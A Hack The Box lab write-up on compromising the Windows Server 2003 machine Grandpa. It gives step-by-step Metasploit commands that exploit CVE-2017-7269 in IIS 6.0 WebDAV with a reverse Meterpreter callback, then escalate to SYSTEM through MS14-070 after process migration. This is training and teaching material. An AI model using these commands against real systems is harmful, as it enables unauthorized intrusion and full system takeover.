# Hack The Box: Grandpa Writeup

> **Author:** Rully Miftahur Rozaq  
> **Platform:** Hack The Box  
> **Machine:** Grandpa  
> **Category:** Windows / Web Exploitation / Privilege Escalation  
> **Difficulty:** Easy  
> **Completion date:** September 3, 2026

## Summary

This writeup documents the compromise of the **Grandpa** Windows machine in the Hack The Box lab environment. Initial enumeration identified Microsoft IIS 6.0 with WebDAV enabled on TCP port 80. The service was exploited through **CVE-2017-7269**, producing an x86 Meterpreter session running as `NT AUTHORITY\NETWORK SERVICE`.

The initial account could not access the user or administrator profile directories. Local privilege-escalation candidates were identified with Metasploit's Local Exploit Suggester. Several attempts initially failed because the Meterpreter process could not retrieve its security identifier. After migrating the session into another process owned by `NETWORK SERVICE`, the **MS14-070 TCP/IP IOCTL** exploit succeeded and created a new Meterpreter session as `NT AUTHORITY\SYSTEM`. This provided access to both the user and root flags.

## Scope and Authorization

All actions described in this report were performed against a machine supplied by **Hack The Box** for authorized cybersecurity training. The commands must only be used in a CTF, personal laboratory, or another environment where explicit authorization has been granted.

## Testing Environment

| Component | Details |
| --- | --- |
| Attacker machine | Kali Linux running in UTM |
| Target | Hack The Box Grandpa machine |
| Target IP | `10.129.36.190` (temporary lab address) |
| VPN interface IP | `10.10.14.7` |
| Target operating system | Microsoft Windows Server 2003 R2 SP2 x86 |
| Exposed service | TCP/80 — Microsoft IIS 6.0 with WebDAV |
| Primary tools | Nmap, Metasploit Framework, Meterpreter |

> Hack The Box assigns dynamic addresses. Replace the target and VPN addresses with the values assigned to the current lab session.

## 1. Reconnaissance and Enumeration

I started by running Nmap default scripts and service-version detection against the target:

```bash
nmap -sV -sC -T4 -o granny.txt 10.129.36.190
```

The important options were:

- `-sV` identified the version of the exposed service.
- `-sC` executed Nmap's default NSE scripts.
- `-T4` increased the scan speed for the controlled lab environment.
- `-o granny.txt` saved the scan output for later review.

The scan found only TCP port 80 open. The server identified itself as **Microsoft IIS 6.0**, and the WebDAV scan reported methods such as `PROPFIND`, `SEARCH`, `LOCK`, and `UNLOCK`. This made IIS WebDAV the main attack surface.

![Nmap enumeration showing Microsoft IIS 6.0 and WebDAV methods](images/01-nmap-enumeration.png)

*Figure 1 — Nmap identified Microsoft IIS 6.0 and multiple WebDAV methods on TCP port 80.*

## 2. Initial Access Through IIS WebDAV

I searched Metasploit for a module associated with **CVE-2017-7269**:

```text
search exploit CVE-2017-7269
```

Metasploit returned the following module:

```text
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

This module targets a buffer-overflow vulnerability in the IIS 6.0 WebDAV `ScStoragePathFromUrl` function. I selected the module and configured the target and callback settings:

```text
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.129.36.190
set RPORT 80
set LHOST 10.10.14.7
set LPORT 443
show options
run
```

![Metasploit CVE-2017-7269 module and exploit configuration](images/02-cve-module-configuration.png)

*Figure 2 — Selecting and configuring the IIS WebDAV exploit for CVE-2017-7269.*

The exploit successfully sent the Meterpreter stage and opened **session 1**. The session used an x86 Windows Meterpreter payload, matching the target architecture.

![Successful initial Meterpreter session](images/03-initial-meterpreter-session.png)

*Figure 3 — The IIS WebDAV exploit opened the initial Meterpreter session.*

Identity checks showed that the foothold was running with the following service account:

```text
NT AUTHORITY\NETWORK SERVICE
```

This account provided code execution but did not have permission to enter the `Harry` or `Administrator` profile directories. Therefore, local privilege escalation was required.

## 3. Local Privilege-Escalation Enumeration

I placed the Meterpreter session in the background and loaded Metasploit's Local Exploit Suggester:

```text
background
use post/multi/recon/local_exploit_suggester
sessions -l
set SESSION 1
show options
run
```

The `SESSION` value is required because the module must know which existing Meterpreter session and target host it should inspect.

![Local Exploit Suggester configuration and results](images/04-local-exploit-suggester.png)

*Figure 4 — Local Exploit Suggester tested the x86 Windows session and identified several candidates.*

Relevant results included:

```text
exploit/windows/local/ms10_015_kitrap0d
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms14_070_tcpip_ioctl
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ms16_016_webdav
```

The output reported that several modules appeared vulnerable. However, a positive suggester result only indicates that the target may satisfy the exploit's known conditions; it does not guarantee successful exploitation.

## 4. Failed Exploitation Attempts

I first reviewed and attempted candidate modules such as `ms14_058_track_popup_menu` and `ms10_015_kitrap0d`.

![Reviewing MS14-058 and MS10-015 local exploit options](images/05-local-exploit-options.png)

*Figure 5 — Reviewing local exploit candidates returned by the suggester.*

The `ms10_015_kitrap0d` attempt failed before creating an elevated session:

```text
Exploit failed: Rex::Post::Meterpreter::RequestError
stdapi_sys_config_getsid: Operation failed: Access is denied.
Exploit completed, but no session was created.
```

![MS10-015 failure and the validated candidate list](images/06-failed-exploit-and-candidates.png)

*Figure 6 — The initial local exploit attempt failed while Meterpreter was retrieving the session SID.*

I then configured `ms14_070_tcpip_ioctl`, which specifically supported Windows Server 2003 SP2:

```text
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
set LHOST 10.10.14.7
set LPORT 444
run
```

The first attempt produced the same `stdapi_sys_config_getsid` access-denied error. Because the exploit failed before reaching its main exploitation stage, this indicated a problem with the current Meterpreter process or token context rather than with the reverse connection settings.

![Initial MS14-070 attempt failing during SID retrieval](images/07-ms14-070-initial-failure.png)

*Figure 7 — MS14-070 initially failed because Meterpreter could not retrieve the SID in its current process context.*

## 5. Stabilizing the Meterpreter Session

To investigate the session context, I returned to session 1 and enumerated the running processes:

```text
sessions -i 1
ps
```

The process list showed several x86 processes owned by `NT AUTHORITY\NETWORK SERVICE`, including:

| PID | Process | User |
| ---: | --- | --- |
| 1988 | `wmiprvse.exe` | `NT AUTHORITY\NETWORK SERVICE` |
| 2264 | `w3wp.exe` | `NT AUTHORITY\NETWORK SERVICE` |
| 2332 | `davcdata.exe` | `NT AUTHORITY\NETWORK SERVICE` |

![Meterpreter process enumeration](images/08-process-enumeration.png)

*Figure 8 — Process enumeration identified alternative x86 processes running under NETWORK SERVICE.*

I migrated Meterpreter into `davcdata.exe` with PID 2332:

```text
migrate 2332
```

Metasploit confirmed that the migration from PID 2448 to PID 2332 completed successfully. The migration retained the same user context but placed Meterpreter inside a more suitable and stable process.

## 6. Privilege Escalation to SYSTEM

After migration, I placed the session in the background and retried MS14-070 with the correct session and callback configuration:

```text
background
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
set LHOST 10.10.14.7
set LPORT 443
run
```

This time, the module successfully triggered the vulnerability and opened **Meterpreter session 2**. I verified the new security context with:

```text
getuid
```

The result confirmed complete local privilege escalation:

```text
Server username: NT AUTHORITY\SYSTEM
```

![Successful MS14-070 exploitation and SYSTEM Meterpreter session](images/09-system-shell.png)

*Figure 9 — After process migration, MS14-070 succeeded and returned a Meterpreter session as SYSTEM.*

## 7. Flag Retrieval

With SYSTEM privileges, I opened a Windows command shell and accessed the user and administrator desktop directories. Windows Server 2003 stores user profiles under `C:\Documents and Settings` rather than the modern `C:\Users` path.

```text
shell
cd /d "C:\Documents and Settings\Harry\Desktop"
dir /a
type user.txt

cd /d "C:\Documents and Settings\Administrator\Desktop"
dir /a
type root.txt
```

Both flags were successfully retrieved. Their values are intentionally omitted from this public writeup.

| Flag | Location | Result |
| --- | --- | --- |
| User flag | `C:\Documents and Settings\Harry\Desktop\user.txt` | Obtained — value redacted |
| Root flag | `C:\Documents and Settings\Administrator\Desktop\root.txt` | Obtained — value redacted |

## Troubleshooting Summary

| Symptom | Cause | Correction | Verification |
| --- | --- | --- | --- |
| `C:\Users` could not be found | Windows Server 2003 uses the older profile structure | Used `C:\Documents and Settings` | The `Harry` and `Administrator` profiles were found |
| `Access is denied` when entering profile directories | Initial session ran as `NETWORK SERVICE` | Continued with local privilege escalation | Directories became accessible as SYSTEM |
| Local exploits failed with `stdapi_sys_config_getsid` | Meterpreter's current process context could not retrieve the SID | Enumerated processes and migrated into PID 2332 (`davcdata.exe`) | Meterpreter migration completed successfully |
| First MS14-070 attempt created no session | Exploit aborted during the SID check | Retried MS14-070 after process migration | Session 2 opened as `NT AUTHORITY\SYSTEM` |

## Important Command Reference

| Command | Purpose |
| --- | --- |
| `nmap -sV -sC -T4 <TARGET_IP>` | Detect services, versions, and common configuration details |
| `search exploit CVE-2017-7269` | Find a Metasploit module associated with the IIS WebDAV vulnerability |
| `sessions -l` | List active Metasploit sessions and their IDs |
| `set SESSION 1` | Select the existing Meterpreter session used by a post or local exploit module |
| `post/multi/recon/local_exploit_suggester` | Check the target for potentially applicable local exploits |
| `ps` | List processes visible to Meterpreter |
| `migrate 2332` | Move Meterpreter into the selected target process |
| `getuid` | Display the account under which the Meterpreter session is running |
| `shell` | Open a native Windows command shell from Meterpreter |
| `type <file>` | Display the contents of a text file in Windows CMD |

## Lessons Learned

1. Service-version information was decisive. IIS 6.0 combined with WebDAV immediately provided a focused path toward CVE-2017-7269.
2. Initial code execution did not equal full compromise. The WebDAV exploit returned a restricted `NETWORK SERVICE` context, so local privilege escalation was still necessary.
3. Local Exploit Suggester results required validation. Multiple candidates appeared vulnerable, but some failed during execution.
4. Process context can determine exploit reliability. Migrating Meterpreter into another x86 process owned by the same account resolved the SID-related failure.
5. Operating-system age affects filesystem conventions. Windows Server 2003 used `C:\Documents and Settings`, not `C:\Users`.

## Conclusion

The Grandpa machine was compromised by exploiting CVE-2017-7269 in Microsoft IIS 6.0 WebDAV. The initial Meterpreter session ran as `NT AUTHORITY\NETWORK SERVICE`, which prevented access to protected user profiles. Metasploit identified several possible local privilege-escalation paths, but early attempts failed because of the Meterpreter process context. After migrating into `davcdata.exe`, the MS14-070 TCP/IP IOCTL exploit successfully created a new session as `NT AUTHORITY\SYSTEM`. The elevated session provided access to both the user and administrator flags, completing the machine.

